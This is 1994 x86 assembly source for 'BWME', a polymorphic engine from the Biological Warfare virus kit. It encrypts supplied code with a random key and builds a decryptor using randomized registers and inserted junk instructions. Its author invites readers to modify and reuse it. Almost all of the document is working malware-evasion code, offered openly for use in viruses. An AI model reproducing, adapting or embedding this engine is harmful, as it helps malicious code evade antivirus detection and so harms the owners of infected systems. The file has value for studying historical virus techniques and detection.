﻿

; ==========================================================================>
;  BWME : A (very) basic polymorphic engine 
;  Written for Biological Warfare v1.00
;  By MnemoniX - Version 1.00 1994
;  Size : 609 Bytes
;  Modification is permitted - nay, encouraged - but please maintain the
;  "BWME" signature.
;
;  Usage :
;
;          Fill registers with appropriate data:
;
;                       DS:SI - code to encrypt
;                       ES:DI - space for encrypted code
;                       CX - size of code
;                       DX - offset of encrypted when run
;
;          Use "call _bwme" to call
;          and at end of program include the line :
;
;                       include bwme.asm
;
;          On return, DS:DX points to space for encrypted code
;          and CX holds the size of the encrypted module.
; ==========================================================================>

_BWME:
                jmp     _bwme_stuff

                db      '[BWME]'

_bwme_stuff:
                push    ax bx es di es di si bp

                call    $ + 3                   ; get our offset
                pop     bp
                sub     bp,offset $ - 1

; 1) Fill in variables with random numbers.

                call    randomize               ; fix random number generator

                push    es di
                lea     di,[bp + reg_1]
                push    cs
                pop     es

                xor     bl,bl
                call    get_register            ; get registers
                stosb                           ; (won't be SP or one
                mov     bl,3
                call    get_register            ;  already used)
                stosb

                mov     al,3                    ; ADD, SUB or XOR?
                call    _random
                stosb

                or      al,-1                   ; random number
                call    _random
                stosb
                
                pop     di es
                mov     cs:[bp + started_at],di ; save starting address

; 2) Fill decryptor registers

                push    ds
                push    cs                      ; DS temporarily = to CS
                pop     ds

                call    garbage                 ; garbage instruction

                call    head_tail               ; load counter or offset?
                jc      counter_first

                call    load_offset             ; offset first
                call    load_counter
                jmp     decryptor

counter_first:
                call    load_counter            ; counter first
                call    load_offset
                jmp     decryptor

load_offset:
                mov     al,[bp + reg_2]
                call    garbage
                add     al,0B8h
                stosb
                mov     [bp + offset_at],di     ; fill the offset value later
                stosw
                ret
load_counter:
                mov     al,[bp + reg_1]         ; counter register
                call    garbage
                add     al,0B8h
                stosb
                mov     ax,cx                   ; store program size
                stosw
                ret

; 3) Load up decryption routine & fix encryption routine

decryptor:
                push    di                      ; save this offset
                call    garbage                 ; more garbage

                mov     ax,802Eh
                stosw

                mov     al,[bp + operation]

                test    al,al                   ; 0 = ADD
                je      do_add
                cmp     al,1                    ; 1 = SUB
                je      do_sub
                                                ; 2 = XOR
                mov     al,30h                  ; get proper operation
do_add:
                push    ax
                cmp     al,28h                  ; if SUB,ADD when encrypting
                je      encrypt_add
                test    al,al
                je      encrypt_sub             ; and vice versa

                mov     al,32h                  ; fix encryption routine
                mov     [bp + encrypt_oper],al  ; same for XOR
                jmp     decryptor_stuff

encrypt_add:
                mov     al,2
                jmp     encrypt_move
encrypt_sub:
                mov     al,2Ah
encrypt_move:
                mov     [bp + encrypt_oper],al

decryptor_stuff:
                pop     ax
                mov     ah,[bp + reg_2]         ; get offset register

                cmp     ah,3                    ; BX
                je      its_bx
                cmp     ah,6                    ; SI
                je      its_si
                ja      its_di                  ; DI

                add     al,46h                  ; BP (word)
                xor     ah,ah
                stosw
                jmp     load_value

its_bx:         add     al,2                    ; this loads up the proper
its_di:         inc     ax                      ; operation instruction
its_si:         add     al,4
                stosb
                jmp     load_value

do_sub:
                mov     al,28h
                jmp     do_add

load_value:
                mov     al,[bp + random_no]
                stosb

; 4) Increment offset register

loaded:
                call    garbage                 ; garbage
                call    head_tail               ; now increment offset reg
                jc      use_increments          ; with INCs or ADDs

                mov     ax,0C083h               ; use an ADD
                add     ah,[bp + reg_2]
                stosw

                mov     al,1
                stosb
                jmp     fix_counter

use_increments:
                mov     al,40h
                add     al,[bp + reg_2]
                stosb

; 5) Decrement counter register & make loop

fix_counter:
                cmp     [bp + reg_1],1          ; if CX, we can use LOOP
                jne     no_loop
                call    head_tail               ; if we want to
                jc      use_loop

no_loop:
                call    garbage
                call    head_tail               ; INC or SUB?
                jc      use_decrement

                mov     ax,0E883h               ; use a SUB
                add     ah,[bp + reg_1]
                stosw
                mov     al,1
                stosb
                jmp     now_jnz

use_loop:
                call    garbage
                pop     ax                      ; offset of decryptor
                sub     ax,di
                sub     al,2
                mov     ah,al
                mov     al,0E2h                 ; store LOOP instruction
                stosw
                jmp     fix_offset

use_decrement:
                mov     al,48h
                add     al,[bp + reg_1]
                stosb

now_jnz:
                pop     ax                      ; offset of decryptor
                sub     ax,di
                sub     al,2
                mov     ah,al
                mov     al,75h                  ; store JNZ instruction
                stosw

; 6) Fix offset register now

fix_offset:
                call    garbage                 ; one last garbage dump

                mov     ax,[bp + started_at]    ; calculate our offset
                sub     ax,di                   ; relative to runtime offset
                neg     ax
                add     ax,dx

                mov     bx,[bp + offset_at]
                mov     es:[bx],ax              ; done

; 7) and now ... we encrypt ....

encryption:
                pop     ds                      ; restore DS
                push    ax                      ; use this later
                push    cx                      ; save size of code

                mov     bl,cs:[bp + random_no]

encrypt_it:
                lodsb
encrypt_oper    db      0
                db      0C3h
                stosb
                loop    encrypt_it

                pop     cx                      ; size of code

                pop     ax
                sub     ax,dx                   ; plus decryption module
                add     cx,ax                   ; done ...
                jmp     bwme_done

; the heap

reg_1           db      4                       ; counter register
reg_2           db      4                       ; offset register
operation       db      0                       ; operation
random_no       db      0                       ; random number

started_at      dw      0                       ; beginning of code
offset_at       dw      0                       ; offset register load

rand_seed       dw      0

; randomize routine

randomize:
                push    cx dx
                xor     ah,ah                   ; get timer count
                int     1Ah
                mov     cs:[bp + rand_seed],dx
                xchg    ch,cl
                add     cs:[bp + rand_seed_2],cx
                pop     dx cx
                ret

; head/tail routine

head_tail:
                mov     ax,2                    ; get a 0 or 1 value
                call    _random                 ; and move CF
                test    al,al
                jz      _head_
                stc
                ret
_head_:         clc
                ret

; get register routine

get_register:
                mov     ax,8                    ; get register
                call    _random
check_reg:
                cmp     al,4                    ; can't use SP or used ones
                je      no_good
                cmp     al,bl
                jb      no_good
                cmp     al,cs:[bp + reg_1]
                je      no_good
                cmp     al,cs:[bp + reg_2]
                je      no_good
                ret                             ; it's good
no_good:
                test    al,al
                jz      blah_blah
                dec     al
                jmp     check_reg
blah_blah:
                mov     al,7
                jmp     check_reg

; random number generator

_random:
                push    cx dx ax                ; save regs
                in      al,40h                  ; timer, for random #
                sub     ax,cs:[bp + rand_seed]
                db      35h                     ; XOR AX,
rand_seed_2     dw      0
                inc     ax
                add     cs:[bp + rand_seed],ax  ; change seed
                xor     dx,dx
                pop     cx
                test    ax,ax                   ; avoid divide by zero
                jz      no_divide
                div     cx
no_divide:
                mov     ax,dx                   ; remainder is the value
                pop     dx cx                   ; returned
                ret

; garbage instruction generator

garbage:
                push    ax
                mov     ax,8                    ; decisions, decisions ...
                call    _random                 ; what garbage to use?

                cmp     al,1                    ; 1 = NOP or SAHF
                je      nop_sahf
                cmp     al,2                    ; 2 = operate, unused reg.
                je      nothing_oper
                cmp     al,3                    ; 3 = STC or CMC
                je      stc_cmc
                cmp     al,4                    ; 4 = jump to next
                je      nothing_jmp             ;     instruction
                cmp     al,5                    ; 5 = CMP instruction
                je      nothing_cmp

garbage_done:
                pop     ax                      ; garbage in, garbage out
                ret

nop_sahf:
                call    head_tail               ; NOP or SAHF
                je      use_sahf
                mov     al,90h
store_gbg:      stosb
                jmp     garbage_done
use_sahf:       mov     al,9Eh
                jmp     store_gbg

nothing_oper:
                xor     bl,bl
                call    get_register
                add     al,0B8h
                stosb
                or      ax,-1
                call    _random
                stosw
                jmp     garbage_done

stc_cmc:
                call    head_tail               ; STC or CMC
                jc      use_cmc
                mov     al,0F9h
                jmp     store_gbg
use_cmc:        mov     al,0F5h
                jmp     store_gbg

nothing_jmp:
                mov     ax,10h                  ; random jump instruction
                call    _random
                add     al,70h
                xor     ah,ah
                stosw
                jmp     garbage_done

nothing_cmp:
                mov     ax,800h                 ; nothing CMP
                call    _random
                xor     al,al
                add     ax,0F881h
                stosw
                call    _random
                stosw
                jmp     garbage_done

bwme_done:
                pop     bp si dx ds di es bx ax
                ret
_bwme_end:

